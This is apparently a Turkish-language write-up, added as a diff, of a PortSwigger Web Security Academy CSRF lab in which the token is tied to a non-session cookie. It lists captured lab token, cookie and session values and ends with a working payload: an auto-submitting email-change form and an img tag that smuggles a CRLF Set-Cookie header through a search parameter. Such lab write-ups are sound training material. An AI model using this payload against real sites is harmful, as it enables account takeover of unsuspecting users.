@@ -1,0 +1,44 @@
+Lab: CSRF where token is tied to non-session cookie
+
+url :https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
+
+
+süreç:
+--burp aracında carlos hesabının mail değişim işlemini yakalayıp repeatera gönderdim ve analizi burda yürüttüm.
+
+gözlem:
+-- token ve cookie parametreleri ile desteklenmiş olduğunu fark ettim 
+-- post ve get metodlarının ikisinede  cooki ve tokenlar zorunlu kılınmış.
+-- yanlış token veya cookie kabul edilmiyor.
+-- csrf cookiesi ve tokeni oturuma entegre edilememiş . Oturumdan bağımsız değer alıyorlar .
+
+Saldırı planı:
+
+-- Bir post methodu oluşturup bu methodun içine ana hesabımızda kullanılmadan yakalayacağımız cookie ve token değerleri kullanılarak
+istek yapılması ve hedefin mail adresinin değiştirilmesi
+
+payload:
+
+-- CARLOS |
+          |-token ---> csrf=QtW4VMNqakDBivW33UMMZrKZFhTZt057 + email bilgisi
+          |-cookie ---> csrfKey=qyf8nIaO8UDLzkvd5m51g56tPJHcSias; session=AtLxcc9K2FZiseZQBdUkMGIByjxE9PhJ
+
+
+-- WİENER |
+          |-token ---> csrf=IlFLMXqBkZAh0JCsBQB6vG3BNCUV7eR2 + email bilgisi
+          |-cookie ---> csrfKey=C9zAcFQRcGxCgGLKmWc92f1lbiL3Hr88; session=5QeC7JIKMBMNmqLBbrDMbsOclpl1o41t
+
+
+
+
+    Payloadın ilk kısımı zaten önceki lablarla aynı.Bu labda ise değişen şey bu senaryoda isteğin header kısmına bir cookie eklememiz gerekiyordu.
+bunu img tagı sayesinde ekledik .
+
+    İmg tagı sitediki arama kısmında aranan değerin bir cookie olarak eklendiğini fark edince set cooki ile yeni bir cookie oluşturmamzı sağlayan fırsat tanıdı bize.
+
+         <form method="POST" action="https://0ae200bf04b3ce5781e8853c00560046.web-security-academy.net/my-account/change-email">
+            <input type="hidden" name="email" value="hacked@harbinger.cim" />
+            <input type="hidden" name="csrf" value="QtW4VMNqakDBivW33UMMZrKZFhTZt057" />
+            <input type="submit" value="Submit request" />
+        </form>
+        <img src="https://0ae200bf04b3ce5781e8853c00560046.web-security-academy.net/?search=dark%0d%0aSet-Cookie:%20csrfKey=qyf8nIaO8UDLzkvd5m51g56tPJHcSias%3b%20SameSite=None"  onerror="document.forms[0].submit()">
